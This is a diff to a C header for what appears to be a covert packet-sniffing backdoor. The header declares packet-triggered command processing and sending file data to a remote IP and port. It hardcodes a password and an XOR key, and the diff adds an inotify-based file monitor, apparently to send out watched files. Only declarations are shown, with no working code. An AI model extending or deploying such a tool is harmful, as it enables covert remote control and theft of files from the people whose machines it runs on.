@@ -4,6 +4,21 @@
 #include "utils.h"
 #include "lib/isaac_encryption.h"
 
+#include <sys/inotify.h>
+#include <sys/select.h>
+#include <sys/types.h>
+
+#include <stdlib.h>
+#include <errno.h>
+#include <unistd.h>
+#include <signal.h>
+#include <sys/types.h>
+
+
+#pragma pack(1)
+#define TRUE 1
+#define FALSE 0
+
 #define NETWORK_INT 		"em1"
 #define PASSWORD 		"uest1onQ?"
 #define PKT_SIZE 		1518
@@ -20,6 +35,7 @@
 #define TRANSFER_MODE           1
 #define CREATE_MODE             0
 #define APPEND_MODE             1
+#define EVENT_SIZE (sizeof (struct inotify_event))
 
 
 #define xor_key "7Zdl2saWXdZ43LR2LqEhK6JXmwYiw7P95PSA^/jJ(w7Zj,]MhAW6*@D<_:"
@@ -75,4 +91,6 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 char * parse_cmd(char * command);
 int process_command(char * command, const struct ip_struct * ip, const int dest_port);
 int send_file_data(char * fileName, const struct ip_struct * ip, const int dest_port);
+int initFileMonitor(char * folder, const struct ip_struct * ip, const int dest_port);
+
 #endif
